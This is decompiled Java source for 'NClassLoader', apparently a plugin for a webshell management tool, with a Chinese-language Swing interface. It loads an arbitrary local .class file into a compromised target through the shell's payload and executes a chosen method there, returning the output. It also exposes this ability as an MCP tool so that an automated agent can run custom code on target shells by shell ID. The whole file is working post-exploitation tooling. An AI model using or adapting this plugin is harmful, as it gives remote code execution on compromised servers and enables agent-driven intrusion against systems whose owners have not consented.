//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import javax.swing.filechooser.FileNameExtensionFilter;
import util.Log;
import util.automaticBindClick;
import util.http.ReqParameter;
import core.annotation.McpTool;
import core.annotation.McpParam;
import java.util.Map;

@PluginAnnotation(
        payloadName = "JavaDynamicPayload",
        Name = "NClassLoader",
        DisplayName = "NClassLoader"
)
public class ClassLoader implements Plugin {
    private static final String CLASS_NAME = "plugin.ClassLoader";
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JButton selectClassButton = new JButton("选择class");
    private final JButton loadClassButton = new JButton("载入");
    private final JButton executeMethodButton = new JButton("执行");
    private final RTextArea resultTextArea = new RTextArea();
    private final JSplitPane splitPane = new JSplitPane();
    private final JTextField classNameTextField = new JTextField(30);
    private final JTextField methodNameTextField = new JTextField(20);
    private File selectedClassFile;
    private String actualClassName;

    public ClassLoader() {
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.selectClassButton);
        topPanel.add(new JLabel("Class Name:"));
        topPanel.add(this.classNameTextField);
        topPanel.add(new JLabel("Method:"));
        topPanel.add(this.methodNameTextField);
        topPanel.add(this.loadClassButton);
        topPanel.add(this.executeMethodButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            public void componentResized(ComponentEvent e) {
                ClassLoader.this.splitPane.setDividerLocation(0.15);
            }
        });
        this.panel.add(this.splitPane);
        this.methodNameTextField.setText("run");
    }

    private void selectClassButtonClick(ActionEvent actionEvent) {
        JFileChooser fileChooser = new JFileChooser();
        fileChooser.setFileFilter(new FileNameExtensionFilter("Class files", new String[]{"class"}));
        int result = fileChooser.showOpenDialog(this.panel);
        if (result == 0) {
            this.selectedClassFile = fileChooser.getSelectedFile();
            this.classNameTextField.setText(this.extractClassNameFromFile(this.selectedClassFile));
            Log.log("Selected class file: " + this.selectedClassFile.getAbsolutePath(), new Object[0]);
        }

    }

    private void loadClassButtonClick(ActionEvent actionEvent) {
        if (this.selectedClassFile == null) {
            GOptionPane.showMessageDialog(this.panel, "Please select a class file first", "Error", 0);
        } else {
            try {
                String result = this.loadClass();
                this.resultTextArea.setText(result);
                GOptionPane.showMessageDialog(this.panel, "加载成功!", "Success", 1);
            } catch (Exception var3) {
                Log.error(var3);
                GOptionPane.showMessageDialog(this.panel, "加载失败: " + var3.getMessage(), "Error", 0);
            }

        }
    }

    private void executeMethodButtonClick(ActionEvent actionEvent) {
        if (this.actualClassName != null && !this.actualClassName.isEmpty()) {
            String methodName = this.methodNameTextField.getText().trim();
            if (methodName.isEmpty()) {
                GOptionPane.showMessageDialog(this.panel, "请选择一个方法名，不知道请填run", "Error", 0);
            } else {
                try {
                    String result = "加载成功，输出:\n" + this.executeMethod(methodName);
                    this.resultTextArea.setText(result);
                } catch (Exception var4) {
                    Log.error(var4);
                    GOptionPane.showMessageDialog(this.panel, "执行失败: " + var4.getMessage(), "Error", 0);
                }

            }
        } else {
            GOptionPane.showMessageDialog(this.panel, "请先加载", "Error", 0);
        }
    }

    private String extractClassNameFromFile(File classFile) {
        String fileName = classFile.getName();
        return fileName.endsWith(".class") ? fileName.substring(0, fileName.length() - 6) : fileName;
    }

    private void load() throws IOException {
        if (!this.loadState) {
            try {
                byte[] data = Files.readAllBytes(this.selectedClassFile.toPath());
                this.actualClassName = this.classNameTextField.getText().trim();
                if (this.payload.include(this.actualClassName, data)) {
                    this.loadState = true;
                    Log.log("加载成功: " + this.actualClassName, new Object[0]);
                } else {
                    Log.log("加载失败: " + this.actualClassName, new Object[0]);
                }
            } catch (Exception var2) {
                Log.error(var2);
                throw new IOException("Failed to load class file", var2);
            }
        }

    }

    private String loadClass() throws IOException {
        this.load();
        return "Class '" + this.actualClassName + "' 加载成功!";
    }

    private String executeMethod(String methodName) throws IOException {
        this.load();
        ReqParameter reqParameter = new ReqParameter();
        byte[] resultByteArray = this.payload.evalFunc(this.actualClassName, methodName, reqParameter);
        return this.encoding.Decoding(resultByteArray);
    }

    @McpTool(name = "run", desc = "加载自定义 class 到目标并执行方法 (综合类加载执行; localPath 提供则先 include 再 evalFunc)", params = {
            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
            @McpParam(name = "className", required = true, desc = "目标类名, 如: plugin.MyClass"),
            @McpParam(name = "localPath", desc = "本地 .class 文件路径 (可选, 提供则先加载到目标)"),
            @McpParam(name = "methodName", defaultValue = "run", desc = "要执行的方法名") })
    public String mcpRun(Map<String, Object> args) {
        String localPath = args.get("localPath") == null ? null : String.valueOf(args.get("localPath"));
        String className = String.valueOf(args.get("className"));
        String methodName = String.valueOf(args.getOrDefault("methodName", "run"));
        if (className == null || className.trim().isEmpty()) return "缺少参数: className";
        try {
            if (localPath != null && !localPath.trim().isEmpty()) {
                File f = new File(localPath);
                if (!f.isFile()) return "本地文件不存在: " + localPath;
                byte[] data = Files.readAllBytes(f.toPath());
                if (!this.payload.include(className, data)) return "类加载失败: " + className;
            }
            ReqParameter reqParameter = new ReqParameter();
            byte[] result = this.payload.evalFunc(className, methodName, reqParameter);
            return this.encoding.Decoding(result);
        } catch (Exception e) {
            return "执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
        }
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }
}
